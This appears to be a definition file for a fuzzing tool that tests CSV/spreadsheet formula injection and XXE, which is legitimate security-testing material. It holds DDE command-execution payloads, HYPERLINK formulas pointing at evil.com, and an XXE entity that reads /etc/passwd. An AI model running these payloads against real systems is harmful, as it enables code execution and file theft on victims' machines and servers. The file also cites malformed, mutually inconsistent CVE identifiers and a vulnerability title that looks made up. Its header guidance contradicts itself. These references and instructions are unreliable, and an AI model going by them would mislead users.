---
name: formula_injection
description: "CSV and spreadsheet formula injection testing (CVE-2014-achenf, etc.)"
triggers:
  - csv injection
  - formula injection
  - spreadsheet injection
  - excel injection
  - =cmd
  - =HYPERLINK
  - DDE
  - csvi
  - xxe
  - xml injection
  - xxep
metadata:
  category: fuzzing
  tools: [fuzzer]
  scope: targets
---

## Overview

Formula injection (also known as CSV injection or spreadsheet injection) occurs when user input is embedded into CSV/Excel files without proper sanitization. When opened in spreadsheet applications like Excel or LibreOffice Calc, formula characters (`=`, `+`, `-`, `@`) can be interpreted as formula prefixes, leading to code execution.

## Capabilities

- CSV formula injection detection
- XML external entity (XXE) injection testing
- Spreadsheet-specific payload generation
- Safe output encoding verification
- Export function security testing

## Formula Injection Payloads

**Excel/LibreOffice Formula Prefixes:**
```
=cmd|' /C calc'!A0
=HYPERLINK("http://evil.com")
+cmd|' /C calc'!A0
-cmd|' /C calc'!A0
@SUM(A1:A100)
```

**CSV Context:**
```csv
Name,Value,Description
=cmd|' /C notepad'!A0,100,Test
+HYPERLINK("http://evil.com"),200,Data
-2+3+cmd|' /C calc'!A0,300,Result
@SUM(1+2+3),400,Total
```

**XML/XXE Payloads:**
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<data>&xxe;</data>
```

## Usage

### Test CSV Export Endpoint

```bash
slapper fuzz --target https://example.com/api/export --type csv --param query
```

### Test XML Export for XXE

```bash
slapper fuzz --target https://example.com/api/data.xml --type xxe
```

### Custom Formula Payloads

```bash
slapper fuzz --target https://example.com/export.csv --payloads ./formula_payloads.txt
```

## Triggers

Keywords: csv injection, formula injection, spreadsheet, excel, =cmd, hyperlink, dde, csvi, xxe, xml injection, export, download, report, csv export

## Best Practices

1. **Identify export points**: Look for `/export`, `/download`, `/report`, `/data` endpoints
2. **Test formula prefixes**: Inject `=`, `+`, `-`, `@` at start of input
3. **Check Unicode bypass**: Test fullwidth variants (U+FF1D, U+FF0B, U+FF0D, U+FF20) - these are normalized by NFKC before checking
4. **Check XML endpoints**: Test for XXE in XML-generating endpoints
5. **Verify output encoding**: Ensure `escape_csv()` and `escape_xml()` are applied
6. **Test blind vectors**: Some formula injection requires opening in actual spreadsheet

## Security Headers

When testing, verify these security headers are absent or restrictive:
- `Content-Disposition: attachment` (forces download, safer)
- `X-Content-Type-Options: nosniff` (prevents MIME sniffing)

## References

- CWE-1236: Improper Neutralization of Formula Elements in CSV File
- CVE-2014-chenf: GlobalSCAPE Canvas frmset About Box CSV Injection
- OWASP: CSV Injection
